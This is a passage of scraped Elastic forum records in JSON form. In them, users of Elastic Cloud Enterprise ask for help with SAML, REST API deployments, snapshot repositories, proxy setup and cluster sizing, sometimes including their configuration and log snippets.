    "id": "383573c5-4221-41a7-b02d-beddbae3f9f7",
    "url": "https://discuss.elastic.co/t/hot-warm-migration-need-to-update-prior-template-hot-only-to-recognize-warm-allocators-are-not-valid-targets/185233",
    "title": "Hot-Warm migration - Need to update PRIOR Template (Hot-Only) to recognize WARM Allocators are not valid targets",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Randy-312",
    "date": "June 11, 2019, 3:49pm June 11, 2019, 4:56pm June 12, 2019, 8:50pm June 26, 2019, 8:50pm",
    "body": "In moving to Hot-Warm nodes, our Prior Template did NOT have an instance configuration that used the box_type values. So, migrating a cluster to hot-warm configuration went fine, and it started proplerly using WARM node allocators. However, the clusters using the OLD Template eventually started putting nodes (which were hot) onto the warm node allocators. Performance was not bad (on AWS), but we realize that this is problematic and are looking at how to fix this now. Yes, our Admin-Console-Elasticsearch is Now ALSO on WARM.. which is clearly not ideal. Should we A) Modify the Template to use a new instance configuration id (HOT node format). ... If we do.. how can we roll this out? It isn't taking effect immediatly, so appears we need to run the plan for it to take effect. B) Should we create a NEW Plan, and then change the Cluster to use the New Plan. .... I know we couldn't do a hot/warm migration in one version, but not sure about 2.2.2 ... Will this change the ElasticSearch cluster id if we do this? C) something else",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c82ef9f3-f37b-4ab6-b81c-73faea48aba7",
    "url": "https://discuss.elastic.co/t/cluster-saml-integration/184850",
    "title": "Cluster SAML integration",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "afuggetta",
    "date": "June 8, 2019, 7:21pm June 10, 2019, 1:21pm June 10, 2019, 1:25pm June 10, 2019, 1:34pm June 24, 2019, 1:39pm",
    "body": "Hello, I am trying to setup an ECE cluster security with SAML. This is what I put into the settings_overrides for the data nodes: xpack.security.authc.token.enabled: true xpack.security.authc.realms.saml.saml1: order: 2 idp.metadata.path: \"https://xxx_metadata.xml\" idp.entity_id: \"https://xxx.com\" sp.entity_id: \"xxx.com\" sp.acs: \"https://xxx:443/api/security/v1/saml\" sp.logout: \"https://xxx.com/logout\" attributes.principal: \"Principal\" attributes.groups: \"Groups\" And this is what I set for the kibana settings_overrides: xpack.security.authProviders: [saml, basic] server.xsrf.whitelist: [/api/security/v1/saml] Kibana never provisions when I add the aforementioned settings. The error I see in the logs is this: ERROR [kibana] elastic/elastic.go:117 error making http request: Get https://xxxx:18674/api/status: dial tcp xxxx:18674: connect: connection refused I can't find any info about the port 18674... Also I'm not sure if the elasticsearch configuration goes in the data node or master node. Thanks.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "c21707bc-b970-4b49-b68a-5a9b395e7bfe",
    "url": "https://discuss.elastic.co/t/performance-page-on-the-deployment-page/184843",
    "title": "\"Performance page\" on the deployment page?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "apaulsen",
    "date": "June 8, 2019, 3:58pm June 8, 2019, 5:53pm June 22, 2019, 5:53pm",
    "body": "https://www.elastic.co/guide/en/cloud/saas-release/ec-monitoring.html 3. From your deployment menu, go to the Performance page. IT's a stupid question, but I can't find the \"Performance page\" on the deployment page. TIA, Agnes",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a5b55248-7df6-4a31-bf43-56fee0c3d385",
    "url": "https://discuss.elastic.co/t/search-index-none-of-the-configured-nodes-were-available/184278",
    "title": "Search Index: None of the configured nodes were available",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "apaulsen",
    "date": "June 5, 2019, 5:39am June 5, 2019, 5:55am June 9, 2019, 3:27am June 5, 2019, 2:15pm June 8, 2019, 3:56pm June 22, 2019, 3:56pm",
    "body": "index docs store mp_v 106319763 8gb A Sprinboot Application generates 10000 search queries with 10 parallel threads against a classical local and remote ELK System. This takes 40 minutes. Running the same set of queries against an ECE Cluster it runs into the exception \"None of the configured nodes were available\". Our developers raise the exception only after getting no answer for the last 20 search queries against the ECE Cluster. We get the exception in a time range from two minutes to eleven minutes after starting the search queries. The ECE Cluster has 16 GB RAM and the JVM pressure reaches a maximum of 52 percent Where can we start to analyze the breakdowns? It seems not to be a network problem. TIA, Agnes",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "1099deed-91b2-4f96-8444-6ea508fddf52",
    "url": "https://discuss.elastic.co/t/ece-ram-to-storage-ratio-with-restful-api/181706",
    "title": "ECE RAM to Storage Ratio with Restful API",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "apaulsen",
    "date": "May 19, 2019, 9:13am May 20, 2019, 1:20pm May 20, 2019, 8:23pm May 20, 2019, 8:51pm May 21, 2019, 5:41am June 3, 2019, 4:02pm June 3, 2019, 4:47pm June 3, 2019, 7:20pm June 3, 2019, 8:44pm June 3, 2019, 9:14pm June 4, 2019, 7:04am June 18, 2019, 7:11am",
    "body": "Hi, my question was partly answered already in ECE RAM to Storage Ratio Adding this in advanced configuration via UI it works fine \"overrides\": { \"quota\": { \"fs_multiplier\": 16 } } } But trying to set the same via Restful API doesn't work - obviously I use the wrong syntax or the wrong place to define it. My \"data\" overrides-setting is ignored. This is my json file: { \"cluster_name\" : \"MYCluster\", \"plan\" : { \"elasticsearch\" : { \"version\" : \"6.6.0\" }, \"cluster_topology\" : [ { \"memory_per_node\" : 2048, \"node_count_per_zone\" : 1, \"node_type\" : { \"data\" : true, \"ingest\" : true, \"master\" : true }, \"zone_count\" : 1 } ], \"deployment_template\": { \"id\": \"c7159de3c438493b9925474390a8a6a0\" } }, \"data\" : { \"overrides\": { \"quota\": { \"fs_multiplier\": 16 } } } } TIA, Agnes",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "f1da6bfb-646f-4c19-916f-8c65f4d1631a",
    "url": "https://discuss.elastic.co/t/change-name-of-system-deployment/183950",
    "title": "Change name of system deployment",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "lovegronvall",
    "date": "June 3, 2019, 11:48am June 3, 2019, 1:19pm June 3, 2019, 1:46pm June 17, 2019, 1:46pm",
    "body": "Hello! Did anyone change name of the system deployments in ECE? I'm thinking of: logging-and-metrics admin-console-elasticsearch security It would make my life easier to set a uniform prefix to them like SYSTEM-logging-and-metrics. I just want to make sure that there are no system stuff depending on the deployment names before I go ahead. Best regards",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "459c8fc9-2c2f-4c79-b92c-beb573b6547e",
    "url": "https://discuss.elastic.co/t/minio-for-ece-snapshots/183066",
    "title": "Minio for ECE Snapshots",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "May 28, 2019, 10:43am May 28, 2019, 11:06am June 11, 2019, 11:07am",
    "body": "I have a single dockerised instance of Minio and have a bucket for one of the deployment clusters in ECE. Does each deployment cluster require its own separate Minio bucket or can all the clusters share one bucket?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "30449c3f-3a9f-4d7e-8d0e-6213480f2f1a",
    "url": "https://discuss.elastic.co/t/security-cluster-cannot-restart/182505",
    "title": "Security cluster cannot restart",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "afuggetta",
    "date": "May 23, 2019, 6:40pm May 23, 2019, 7:16pm May 23, 2019, 8:37pm May 23, 2019, 9:30pm June 6, 2019, 9:37pm",
    "body": "Hello, I experienced some issues with my machine and had to restart docker. Somehow the docker /var/run/docker.sock file becomes a folder and ECE stops working. The security cluster showed not healthy and I tried to restart it. But it always hangs without completing. Is there a way to force the security cluster to stop or one of the nodes to get out of maintenance mode? (Yellow icon) Thanks",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "1d207eb3-4cae-49d1-a0b6-9b3415ce81de",
    "url": "https://discuss.elastic.co/t/error-413-and-disk-watermark-on-ece-but-not-on-vanilla-elasticsearch/181372",
    "title": "Error 413 and Disk Watermark on ECE but not on vanilla Elasticsearch",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "May 16, 2019, 10:43am May 16, 2019, 12:54pm May 21, 2019, 9:05am May 21, 2019, 1:45pm May 22, 2019, 4:42am May 22, 2019, 1:54pm May 22, 2019, 9:03pm May 23, 2019, 4:40am May 23, 2019, 7:23pm June 6, 2019, 7:22pm",
    "body": "I am doing bulk indexing on an ECE deployment (running on ES version 7) and encountered 2 errors. The first is error 413 (request entity too large) and it happens when indexing a series of documents around 1 - 2 MB. The error message is: ResponseException[method [POST], host [http://832fc92e50ae46ec9bcd8ca23545258f.ece.dev.gov.sg:9200], URI [/_bulk?timeout=2000s], status line [HTTP/1.1 413 Request Entity Too Large]\\n<html>\\r\\n<head><title>413 Request Entity Too Large</title></head>\\r\\n<body bgcolor=\\\"white\\\">\\r\\n<center><h1>413 Request Entity Too Large</h1></center>\\r\\n<hr><center>nginx/1.11.13</center>\\r\\n</body>\\r\\n</html>\\r\\n]; nested: ResponseException[method [POST], host [http://832fc92e50ae46ec9bcd8ca23545258f.ece.dev.gov The second is that the cluster suddenly turns into read-only mode when bulk indexing halfway. Before this scenario, there were already a number of timeout errors appearing. The timeout message is: ResponseException[method [POST], host [http://832fc92e50ae46ec9bcd8ca23545258f.ece.dev.gov.sg:9200], URI [/_bulk?timeout=2000s], status line [HTTP/1.1 504 Gateway Timeout]\\n{\\\"ok\\\":false,\\\"message\\\":\\\"Timed out waiting for server to produce a response.\\\"}]; nested When bulk indexing the same set of documents on a vanilla Elasticsearch cluster, there were no such errors. The elasticsearch cluster on ECE is running on version 7 while the vanilla Elasticsearch cluster is running on version 6.5 What configuration can be done on ECE to overcome these errors?",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "53c24c5c-6311-4a3f-bc76-5c317b78875c",
    "url": "https://discuss.elastic.co/t/changing-ram-disk-for-logging-and-metrics-leads-to-an-health-issue/182250",
    "title": "Changing RAM/DISK for “logging-and-metrics” leads to an health issue",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "apaulsen",
    "date": "May 22, 2019, 2:19pm May 22, 2019, 3:06pm May 22, 2019, 7:00pm June 5, 2019, 7:00pm",
    "body": "We saw high memory pressure and disk usage on logging-and-metrics. We've decided to increase RAM/Disk via UI, editing the DATA setting to 2GB and 64GB disk space. Intermediately we’ve got a split brain situation. We've restarted the deployment and got the following picture: How to get rid of the old DATA_DEFAULT (her in ZONE-3)?. TIA, Agnes",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "8c24bfc5-150b-4bd6-9f3b-768d5d422e44",
    "url": "https://discuss.elastic.co/t/cluster-deployment-elastic-kibana-via-restful-api-in-one-step/181709",
    "title": "Cluster Deployment elastic+kibana via RESTful API in one step?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "apaulsen",
    "date": "May 26, 2019, 6:48pm May 19, 2019, 4:41pm May 19, 2019, 7:26pm May 20, 2019, 5:17am May 20, 2019, 9:46am May 20, 2019, 2:02pm June 3, 2019, 2:02pm",
    "body": "I've created a cluster deployment with kibana. Making that over UI it is done in saving one configuration, which is than \"separated\" into to two plans (under advanced configuration) for elastic and kibana. I've created the same cluster via API, but haven't found a way to do that in one configuration step. This is my current approach, but I would like to do that in one curl POST, so that the elasticsearch_cluster_id is automatically provided for the kibana plan. Is that possible? curl -k -X POST -u admin:<secret> http://.../api/v1/clusters/elasticsearch -H 'content-type: application/json' -d @add-elastic.json add-elastic.json { \"cluster_name\" : \"MYCluster-KIBANA\", \"plan\" : { \"elasticsearch\" : { \"version\" : \"6.6.0\" }, \"cluster_topology\" : [ { \"memory_per_node\" : 2048, \"node_count_per_zone\" : 1, \"node_type\" : { \"data\" : true, \"ingest\" : true, \"master\" : true }, \"zone_count\" : 1 } ], \"deployment_template\": { \"id\": \"c7159de3c438493b9925474390a8a6a0\" } } } ==> REPLY from API { \"elasticsearch_cluster_id\": \"00a416b0d9d743a787fcdf437215504c\", \"credentials\": { \"username\": \"elastic\", \"password\": \"secret\" } curl -k -X POST -u admin:<secret> http://.../api/v1/clusters/kibana -H 'content-type: application/json' -d @add-kibana.json add-kibana.json { \"elasticsearch_cluster_id\": \"00a416b0d9d743a787fcdf437215504c\", \"plan\": { \"kibana\": {}, \"cluster_topology\": [ { \"instance_configuration_id\": \"kibana\", \"zone_count\": 1, \"size\": { \"resource\": \"memory\", \"value\": 1024 } } ] } }",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "18c1832b-b6b2-4c0c-8b5b-eb5980265829",
    "url": "https://discuss.elastic.co/t/where-is-the-custom-plugins-page-to-upload-synonyms/181389",
    "title": "Where is the Custom plugins page (to upload synonyms)?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "apaulsen",
    "date": "May 16, 2019, 12:40pm May 16, 2019, 12:44pm May 19, 2019, 5:45am May 20, 2019, 1:26pm June 3, 2019, 1:26pm",
    "body": "We've pepared azip-file with internal structure └── dictionaries └── synonyms.txt We can't find \"Custom plugins page\" for uploading the synonyms.txt which is described in the following URL: https://www.elastic.co/guide/en/cloud/current/ec-custom-bundles.html Upload your files You must upload your files before you can apply them to your cluster configuration: Log into the Elasticsearch Service Console. Go to the Custom plugins page. How to upload synonyms? TIA",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "09cf90e4-3483-4e07-ab2f-903aaf5c3e21",
    "url": "https://discuss.elastic.co/t/use-port-443-for-clusters-and-ece-admin/181630",
    "title": "Use port 443 for clusters and ECE admin",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "afuggetta",
    "date": "May 17, 2019, 5:50pm May 17, 2019, 6:25pm May 17, 2019, 6:33pm May 31, 2019, 6:43pm",
    "body": "Hello, How do I change the default 9243 (and potentially 12443) port to use 443 on the ECE installation? Thanks!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c32008dd-1a0e-432e-8ba2-c432ce47c8e8",
    "url": "https://discuss.elastic.co/t/aws-elb-alb-ece-proxy-configuration/181622",
    "title": "AWS ELB/ALB ECE Proxy Configuration",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "chadhanson",
    "date": "May 17, 2019, 4:19pm May 17, 2019, 6:26pm May 31, 2019, 6:26pm",
    "body": "Looking for guidance on setting up an AWS ELB/ALB for my ECE proxy traffic routing to a kibana instance running in the cluster. I have read through the document below on setting up a Route 53 wildcard CNAME to allow for example *.mydomain.com and forward that traffic to my AWS ELB. I also have a requirement for SSL/TLS certificate encryption. I would also like to setup a DNS record for the cluster name so that my customers do not have to remember the long cluster name of 255e2c6646db4af1996161623133cdf1.mydomain.com:9243 and cloud have my customer go to an address like kibana.mydomain.com instead. Thanks for your help! https://www.elastic.co/guide/en/cloud-enterprise/current/ece-wildcard-dns.html",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "382284c7-724b-4f25-a8be-25bee67a1daf",
    "url": "https://discuss.elastic.co/t/deleted-deployment-is-still-visible-under-ui-deployments/180713",
    "title": "Deleted deployment is still visible under UI/Deployments",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "apaulsen",
    "date": "May 12, 2019, 5:52pm May 14, 2019, 1:37pm May 16, 2019, 8:40am May 16, 2019, 12:28pm May 16, 2019, 12:39pm May 16, 2019, 6:38pm May 16, 2019, 7:22pm May 16, 2019, 9:54pm May 30, 2019, 9:54pm",
    "body": "I've deleted an deployment with help of UI. But the deleted deployment remains in UI. Changing into the deployment shows \" Deployment not found. [Go back to deployments].\" MouseOver-Info is \"This deployment is terminated and its data has been deleted\" How can I go rid of this deleted Deployments in UI? TIA, Agnes",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "56f62cd7-d3ef-43f3-bff0-fc4aa81eadfd",
    "url": "https://discuss.elastic.co/t/storage-size-for-ece-cluster/181172",
    "title": "Storage Size for ECE Cluster",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "May 15, 2019, 11:57am May 15, 2019, 12:54pm May 16, 2019, 10:26am May 16, 2019, 12:56pm May 30, 2019, 12:56pm",
    "body": "When creating a new cluster in ECE, there is a fixed amount of storage allocated to the cluster based on the amount of RAM selected. Is this storage immediately reserved by the cluster upon creation of the cluster? For example, when creating a 32GB RAM cluster with the data.default deployment template, the storage allocated is 1024GB. If the disk size is only 900GB, is it possible to create the cluster first, then scale up the storage as more data is indexed into the cluster?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "cbbd0f92-6a59-46fb-91cc-700b8bbaab83",
    "url": "https://discuss.elastic.co/t/unable-to-connect-to-ece-cluster-with-load-balancer/180950",
    "title": "Unable to connect to ECE Cluster with Load Balancer",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "May 14, 2019, 8:30am May 14, 2019, 1:17pm May 15, 2019, 11:16am May 15, 2019, 12:53pm May 16, 2019, 8:56am May 30, 2019, 9:05am",
    "body": "I have Nginx as a LB which sits in front of the ECE proxy. When I added a wildcard DNS which pointed directly to the ECE proxy IP, I was able to connect to the cluster using the cluster endpoint. The DNS record is: *.ece.org -> 10.1.2.3, where 10.1.2.3 is the proxy IP) When a LB sits in front of the proxy, the connection does not work. First, I added a wildcard DNS which points to the LB *.ece.org -> 10.1.2.99 (where 10.1.2.99 is the IP of the load balancer) Then, in the nginx load balancer, the conf file is as follows: upstream ece-proxies{ server 10.1.2.3:9200;} server{ listen 80; server_name *.ece.org; location / { proxy_pass http://ece-proxies/; } Is it correct that the LB just points directly to the IP of the proxy machine? When I entered the proxy machine IP and port directly in the browser, nothing was returned.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "0f92d873-643a-4f58-9a14-a843a01ab1e2",
    "url": "https://discuss.elastic.co/t/ece-saml-integration-error/180616",
    "title": "ECE - SAML integration error",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "afuggetta",
    "date": "May 10, 2019, 7:54pm May 10, 2019, 8:18pm May 13, 2019, 12:53pm May 14, 2019, 1:30pm May 14, 2019, 1:31pm May 14, 2019, 1:46pm May 14, 2019, 2:10pm May 14, 2019, 2:26pm May 14, 2019, 2:30pm May 14, 2019, 2:32pm May 15, 2019, 2:28pm May 15, 2019, 2:33pm May 29, 2019, 2:33pm",
    "body": "Hello, I am trying to setup a SAML integration between ECE and PingFedaration. I have setup the new SAML provider and I get the following error: Authentication cluster failed to process the request Message: Authentication cluster failed the request. Status: [500]; Data: [{\\\"error\\\":{\\\"root_cause\\\":[{\\\"type\\\":\\\"security_exception\\\",\\\"reason\\\":\\\"Cannot find any matching realm for [SamlPrepareAuthenticationRequest{realmName=null, assertionConsumerServiceURL=**http**://xxxxxx.com:12443/api/v1/users/auth/saml/_callback}]\\\"}],\\\"type\\\":\\\"security_exception\\\",\\\"reason\\\":\\\"Cannot find any matching realm for [SamlPrepareAuthenticationRequest{realmName=null, assertionConsumerServiceURL=**http**://xxxxxx.com:12443/api/v1/users/auth/saml/_callback}]\\\"},\\\"status\\\":500}] The odd thing is that the URL is showing as HTTP whereas I set the HTTPS one. I'm guessing that's the issue? Below my settings: Assertion consumer service URL: https://xxxxxx.com:12443/api/security/v1/saml (URL of admin console) Logout URL: https://xxxxxx.com:12443/api/v1/users/auth/_logout (URL of admin console) Other settings are private and will not share, most likely not relevant. Thank you.",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "ae5aff03-7829-4bb7-aba3-cc9b6b0518ab",
    "url": "https://discuss.elastic.co/t/looking-for-an-example-of-template-based-cluster-deployment-via-rest-api/180708",
    "title": "Looking for an example of template based cluster deployment via REST API",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "apaulsen",
    "date": "May 12, 2019, 5:06pm May 14, 2019, 1:39pm May 28, 2019, 1:39pm",
    "body": "Sorry - this is a double to my topic under category \"Elasticsearch\". Correctly it should be placed here - unter \"Elastic Cloud Enterprise\". i use an on prem installation of ECE. I've created a custom Deployment template based on a custom Instance configuration. If I deploy a new cluster via UI it works. How can I create a new cluster based on my custom template vis REST API? I can't find a working example for template based deployment in REST API Reference. Here is what I tried so far: **Variant 1: doesn't work ** (My hope was, that all cluster toplogy info would be taken from template.) curl -k -X POST -u admin ... clusters/elasticsearch -H 'content-type: application/json' -d '{ \"cluster_name\" : \"MyCluster\", \"plan\" : { \"elasticsearch\" : { \"version\" : \"6.6.0\" }, \"deployment_template\": { \"id\": \"c7159de3c438493b9925474390a8a6a0\" } } }' Variant 2: Creates a Cluster, but doesn't use my template curl -k -X POST -u admin ... clusters/elasticsearch -H 'content-type: application/json' -d '{ \"cluster_name\" : \"MyCluster\", \"plan\" : { \"elasticsearch\" : { \"version\" : \"6.6.0\" }, \"cluster_topology\" : [ { \"memory_per_node\" : 2048, \"node_count_per_zone\" : 1, \"node_type\" : { \"data\" : true, \"ingest\" : true, \"master\" : true }, \"zone_count\" : 1 } ], \"deployment_template\": { \"id\": \"c7159de3c438493b9925474390a8a6a0\" } } }' The template id is correct. TIA, Agnes",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "61066ad5-326b-421a-bf96-a936ee0a2e1c",
    "url": "https://discuss.elastic.co/t/use-disk-threshold-defaulting-to-false/179972",
    "title": "Use_disk_threshold defaulting to False",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JamesNotJamez",
    "date": "May 7, 2019, 12:36pm May 7, 2019, 1:25pm May 21, 2019, 1:27pm",
    "body": "Hi, If I create a deployment then update the elasticsearch instances wth the API (not the UI) I can see that the use_disk_threshold is being changed from true to false, even though I am not specifying this anywhere in my config and from what I can see in the documentation it should default to true. Any idea why this change is happening? Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9ddc630a-65d5-40c5-aabe-b82f58481899",
    "url": "https://discuss.elastic.co/t/errors-have-caused-elastic-cloud-enterprise-installation-to-fail/178952",
    "title": "Errors have caused Elastic Cloud Enterprise installation to fail",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Frrrrrunkis",
    "date": "April 29, 2019, 2:05pm April 29, 2019, 2:27pm April 29, 2019, 4:11pm April 29, 2019, 4:59pm April 29, 2019, 6:00pm May 1, 2019, 1:12am May 15, 2019, 1:12am",
    "body": "trying the install and getting the following [elk@console1 data]$ ./elastic-cloud-enterprise.sh install Elastic Cloud Enterprise Installer Start setting up a new Elastic Cloud Enterprise installation by installing the software on your first host. This first host becomes the initial coordinator and provides access to the Cloud UI, where you can manage your installation. To learn more about the options you can specify, see the documentation. NOTE: If you want to add this host to an existing installation, please specify the --coordinator-host and --roles-token flags -- Verifying Prerequisites -- Checking runner container does not exist... PASSED Checking host storage root volume path is not root... PASSED Checking host storage path is accessible... FAILED Path /mnt/data/elastic is not readable Checking host storage path contents matches whitelist... Errors have caused Elastic Cloud Enterprise installation to fail [Errno 13] Permission denied: '/mnt/data/elastic' [elk@console1 data]$ docker --version Docker version 1.13.1, build 07f3374/1.13.1 [elk@console1 data]$ ll total 0 drwxrwxrwx. 2 ansible ansible 6 Apr 26 23:58 elastic CentOS Linux release 7.4.1708 (Core) users ansible:x:1000:1000::/home/ansible:/bin/bash dockerroot:x:994:991:Docker User:/var/lib/docker:/sbin/nologin elk:x:1002:1002::/home/elk:/bin/bash groups ansible:x:1000: dockerroot:x:991:elk elk:x:1002: docker:x:1003:elk",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "3ac080c5-5810-4473-b616-a47969e093d2",
    "url": "https://discuss.elastic.co/t/azure-blob-repository-snapshot/179132",
    "title": "Azure Blob repository snapshot",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "afuggetta",
    "date": "April 30, 2019, 5:34pm April 30, 2019, 6:19pm April 30, 2019, 8:46pm April 30, 2019, 9:06pm May 14, 2019, 9:18pm",
    "body": "Hi All, I have recently installed ECE and I'm trying to evaluate the snapshot functionality. I have everything built on top of Azure so I would like to connect this to an Azure storage account. I have unsuccessfully tried setting up repository with the Advanced option and the following code: { \"type\": \"Azure\", \"settings\": { \"container\": \"containerName\", \"client\": \"storageAccountName\" } } I haven't been able to find good documentation on how to set this up. Such as how to pass credentials to the container etc... Any help is much appreciated. Thanks.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ac25591c-0432-424a-8f30-0b18df5d1b15",
    "url": "https://discuss.elastic.co/t/snapshot-to-minio-https/178662",
    "title": "Snapshot to minio https",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "forestnd",
    "date": "April 26, 2019, 2:32pm April 26, 2019, 3:36pm April 26, 2019, 4:19pm April 26, 2019, 4:48pm May 10, 2019, 4:49pm",
    "body": "Hay all I am trying to set ece to snapshot to my s3 mino server, all worked fine until i tred to start locking it down. I enabled https and switched the port to 443, but now its failing. I done and tcpdump on the minio server and i get the message \"Description: Certificate Unknown (46)\", front what i understand it does not know the certificate. Can i in ECE to it not to check the certificate? or add my certs to ECE? Thanks in advance",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "80254d0e-a413-413d-aff7-302fc3a2a841",
    "url": "https://discuss.elastic.co/t/ece-watcher-attacments/178589",
    "title": "ECE Watcher Attacments",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "April 26, 2019, 9:38am April 26, 2019, 1:54pm May 10, 2019, 1:54pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "79f2b14b-6aa9-4573-a8ab-4393d7a192c4",
    "url": "https://discuss.elastic.co/t/force-logging-and-metrics-cluster-to-run-curator-job/177401",
    "title": "Force logging-and-metrics cluster to run curator job",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JPT",
    "date": "April 18, 2019, 5:53am April 18, 2019, 1:34pm April 23, 2019, 6:11am April 23, 2019, 8:53pm May 7, 2019, 8:53pm",
    "body": "Hello, we had the situation that our logging-and-metrics cluster get a lot of logs, because some trouble with a cluster. This than resulted in two of three nodes had 100% disk space usage. We tried to restart the cluster but afterwards only a bit more space was free. One node was still on 100% disk usage. So we decided to configure temporary a shorter retention rate: ./elastic-cloud-enterprise.sh set-logging-and-metrics-policy --pattern service-logs-* --days 5 ./elastic-cloud-enterprise.sh set-logging-and-metrics-policy --pattern proxy-logs-* --days 5 The problem was now that we had to wait for the automatic job to clean the older logs in the night. Setup: ECE 2.2 Now my question: Is there any possibility to manually trigger the retention clean-up job? It is very unsatisfying to wait for the job to run automatically. Thank you! Jan",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "4a884e09-3ef7-4a9a-87e8-8616b4ceb088",
    "url": "https://discuss.elastic.co/t/how-to-configure-a-deployment-use-more-disk-resource/177559",
    "title": "How to configure a deployment use more disk resource?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "April 19, 2019, 2:50am April 19, 2019, 12:49pm May 3, 2019, 12:49pm",
    "body": "Hi, As I know, we can boost cpu share by changing some settings as below. Need some advice on cpu core number vs memory for ece allocator Elastic Cloud Enterprise In general we recommend trying to keep the cpu:mem ratio in the 1:8 range (that's a typical ratio you'll see in standard AWS hardware) and we have observed issues with smaller clusters not being able to load with 1:11 or worse (the temp fix is described below and there's a full fix coming in 2.2 or 2.3) There's a few workarounds: As you point out you can artificially restrain the allocator capacity .... this makes most sense if you have no control over how the capacity will be used, since in … And ece use blk_io.weight to limit disk resource for container. How does ece limit disk iops for es node? Elastic Cloud Enterprise Hi, As we know, docker provides capability to limit disk iops by using 'blkio-weight' parameter. I notice ece set different 'blkio-weight' for different size es node. What is the strategy behind this? Thanks! I wonder if there is a similar setting for disk like cpu share setting to allow a deployment use more disk resource. thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "aff79fad-0a8e-4574-940d-8b110eab67dd",
    "url": "https://discuss.elastic.co/t/ece-ccs-default-instance-not-found/176714",
    "title": "ECE ccs.default instance not found",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rockybean",
    "date": "April 13, 2019, 1:57am April 13, 2019, 3:25am April 15, 2019, 8:43am April 15, 2019, 9:14am April 15, 2019, 3:59pm April 15, 2019, 4:04pm April 29, 2019, 4:04pm",
    "body": "It looks like a bug in ECE 2.2.0 like below when try to setup a ccs deployment. 31781555119227_.pic_hd.png2510×1408 271 KB",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "0c5cd672-bb15-4ba8-907c-01b08db8f43f",
    "url": "https://discuss.elastic.co/t/add-subdomain-to-kibana-instance/176235",
    "title": "Add subdomain to kibana instance",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "tehho",
    "date": "April 10, 2019, 2:25pm April 10, 2019, 3:43pm April 11, 2019, 6:23am April 11, 2019, 1:14pm April 25, 2019, 1:14pm",
    "body": "Hi. We would like to add a diffrent subdomain to our kibana instances for human readable urls. How do we do this? Example: backup-test.example.com When we have a CNAME from backup-test.example.com pointed to GUID.example.com and GUID.example.com pointed to the ece proxy loadbalancer ip this works. But not when we have backup-test.example.com pointed directly to the ip. To handle easy setup we want to be able to create CNAME clustername.example.com pointed to eceproxy.example.com and handle the clustername in the kibana config in ece. We have setup xpack.security.public using below settings: xpack.security.public: protocol: https hostname: backup-test.example.com port: 443 Are there some dns lookups in ece that translates the host to a cname if not found? Best regards Andreas Antonsson Collectorbank",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "76d25466-97bb-45fa-bd15-4970afefc99c",
    "url": "https://discuss.elastic.co/t/reindex-from-es-on-kubernetes-to-ece/175586",
    "title": "Reindex from ES on Kubernetes to ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Costi",
    "date": "April 5, 2019, 11:58am April 5, 2019, 12:32pm April 5, 2019, 3:52pm April 8, 2019, 12:00pm April 22, 2019, 12:00pm",
